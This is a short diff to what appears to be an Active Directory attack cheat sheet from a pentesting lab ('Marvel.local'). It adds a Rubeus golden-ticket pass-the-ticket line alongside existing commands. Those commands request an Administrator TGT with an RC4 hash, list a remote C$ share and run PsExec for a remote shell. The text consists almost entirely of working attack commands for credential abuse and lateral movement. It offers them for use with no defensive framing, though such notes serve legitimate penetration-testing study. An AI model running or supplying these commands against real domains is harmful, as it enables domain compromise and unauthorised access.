@@ -12,6 +12,7 @@ misc::cmd
 
 #using the Rubeus
 Rubeus.exe asktgt /domain:Marvel.local /user:Administrator /rc4:f56a8399599f1be040128b1dd9623c29 /ptt
+Rubeus.exe ptt /ticket:golden.kirbi
 dir \\<domain-ip>\C$ 
 PsExec.exe \\192.168.1.105 cmd.exe
 
